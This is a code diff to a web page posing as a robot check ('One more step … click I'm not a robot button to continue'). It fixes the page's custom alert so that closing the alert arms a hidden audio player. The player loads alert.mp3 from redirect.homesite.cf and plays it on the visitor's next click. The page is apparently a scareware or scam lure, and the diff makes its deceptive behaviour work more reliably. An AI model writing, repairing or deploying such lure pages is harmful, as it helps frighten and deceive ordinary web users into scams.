@@ -25,6 +25,8 @@ if(navigator.userAgent.match(/MSIE|Trident/i)) { } else { sessionStorage.setItem
 html, body { font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; }
 </style>
 
+<div id="audio"></div>
+
 </head>
 <body>
 <h1 style="font-size: 40px; width: 90%; margin-left: auto; margin-right: auto; margin-top: 30px!important; margin-bottom: 25px!important; text-align: center; letter-spacing: 1px;"><span style="font-weight: bold;">One more step</span></h1><h2 style="text-align: center; width: auto; margin-left: auto; margin-right: auto; margin-bottom: 75px!important; font-size: 25px; letter-spacing: 0.5px;"><span style="font-weight: normal;">Please click I'm not a robot button to continue !</span></h2>
@@ -769,7 +771,7 @@ html, body { font-family: Arial, Helvetica, sans-serif!important; -webkit-text-s
         btn.id = "closeBtn";
         btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
         btn.onclick = function() {
-          removeCustomAlert(); document.write('<div id="audio"></div>');var sound = document.createElement('audio'); sound.id = 'audio-player'; sound.controls = 'controls hidden'; sound.src = 'https://redirect.homesite.cf/alert.mp3'; sound.type = 'audio/mpeg'; document.querySelector('body').onclick = function() { document.getElementById('audio').appendChild(sound); document.getElementById('audio-player').play(); };
+          removeCustomAlert(); var sound = document.createElement('audio'); sound.id = 'audio-player'; sound.controls = 'controls hidden'; sound.src = 'https://redirect.homesite.cf/alert.mp3'; sound.type = 'audio/mpeg'; document.querySelector('body').onclick = function() { document.getElementById('audio').appendChild(sound); document.getElementById('audio-player').play(); };
           return false;
         }
         alertObj.style.display = "block";
